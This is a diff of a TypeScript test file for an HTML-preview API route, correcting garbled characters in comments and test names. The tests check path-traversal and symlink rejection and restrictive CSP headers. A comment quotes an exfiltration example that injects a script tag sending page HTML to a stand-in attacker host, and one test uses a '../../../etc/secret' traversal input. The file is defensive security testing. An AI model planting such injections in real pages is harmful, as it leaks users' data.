@@ -1,14 +1,14 @@
 /**
- * Phase 4 Phase 1.5 â€?/api/files/html-preview/[...segments] route.
+ * Phase 4 Phase 1.5 â€” /api/files/html-preview/[...segments] route.
  *
  * Coverage:
  *  - HTML file served with text/html (workspace + home scopes)
  *  - Sibling resources (css / png / js) served with right MIME
  *  - Path escape rejected (../../../etc/secret outside scope)
  *  - Symlink escape rejected
- *  - Malformed scope token â†?400
- *  - Root baseDir â†?403
- *  - Missing file â†?404
+ *  - Malformed scope token â†’ 400
+ *  - Root baseDir â†’ 403
+ *  - Missing file â†’ 404
  *  - Defense-in-depth headers (nosniff, CSP, frame-ancestors)
  *
  * Run: npx tsx --test src/__tests__/unit/html-preview-route.test.ts
@@ -68,7 +68,7 @@ async function callRoute(url: string): Promise<Response> {
   return res;
 }
 
-describe('html-preview route â€?workspace scope', () => {
+describe('html-preview route â€” workspace scope', () => {
   it('serves the HTML file with text/html + restrictive headers', async () => {
     const url = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
       kind: 'workspace',
@@ -112,10 +112,10 @@ describe('html-preview route â€?workspace scope', () => {
   it('CSP denies network egress channels in both modes (connect / frame / object / worker)', async () => {
     // Round 3: the load-bearing exfiltration protection. Scripts in
     // interactive mode can manipulate the DOM but cannot reach out:
-    // fetch / XHR / EventSource / WebSocket â†?connect-src; nested
-    // iframes â†?frame-src; <object> / <embed> â†?object-src; Worker /
-    // ServiceWorker / SharedWorker â†?worker-src; <link rel=manifest>
-    // â†?manifest-src. All 'none' regardless of mode.
+    // fetch / XHR / EventSource / WebSocket â†’ connect-src; nested
+    // iframes â†’ frame-src; <object> / <embed> â†’ object-src; Worker /
+    // ServiceWorker / SharedWorker â†’ worker-src; <link rel=manifest>
+    // â†’ manifest-src. All 'none' regardless of mode.
     const baseUrl = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
       kind: 'workspace',
       baseDir: workspaceDir,
@@ -140,7 +140,7 @@ describe('html-preview route â€?workspace scope', () => {
     }
   });
 
-  it('interactive=1 CSP permits scripts (self/inline/eval ONLY â€?no https)', async () => {
+  it('interactive=1 CSP permits scripts (self/inline/eval ONLY â€” no https)', async () => {
     // Round 4 lockdown: interactive mode does NOT allow https: in
     // script-src. Codex flagged that with https: open, a script
     // could `document.head.appendChild(<script src=https://attacker/?d=outerHTML>)`
@@ -187,7 +187,7 @@ describe('html-preview route â€?workspace scope', () => {
 
   it('CSP never opens form-action or frame-ancestors regardless of mode', async () => {
     // These two directives are constraints we don't relax for
-    // interactive mode â€?forms posting back to arbitrary endpoints
+    // interactive mode â€” forms posting back to arbitrary endpoints
     // and iframes embedding into other origins are not part of the
     // "preview HTML in our app" contract.
     const baseUrl = buildHtmlPreviewUrl(path.join(workspaceDir, 'index.html'), {
@@ -303,7 +303,7 @@ describe('html-preview route â€?workspace scope', () => {
   });
 });
 
-// Module-level setup for the home-scope suite â€?node:test's
+// Module-level setup for the home-scope suite â€” node:test's
 // module-scoped `after` (imported above) cleans up.
 const originalHome = process.env.HOME;
 const originalUserProfile = process.env.USERPROFILE;
@@ -325,7 +325,7 @@ after(() => {
   else process.env.USERPROFILE = originalUserProfile;
 });
 
-describe('html-preview route â€?home scope', () => {
+describe('html-preview route â€” home scope', () => {
   it('serves an in-home external HTML file', async () => {
     const url = buildHtmlPreviewUrl(path.join(homeExternalDir, 'desktop.html'), { kind: 'home' });
     const res = await callRoute(url);
@@ -336,7 +336,7 @@ describe('html-preview route â€?home scope', () => {
 
   it('rejects an out-of-home path even with home scope token', async (t) => {
     // Try to escape out of $HOME via /tmp. Real-path of /tmp is outside
-    // homedir â†?assertRealPathInBase rejects.
+    // homedir â†’ assertRealPathInBase rejects.
     const home = path.resolve(os.homedir());
     const outsideBase = [os.tmpdir(), process.cwd()].find((candidate) => {
       const relative = path.relative(home, path.resolve(candidate));
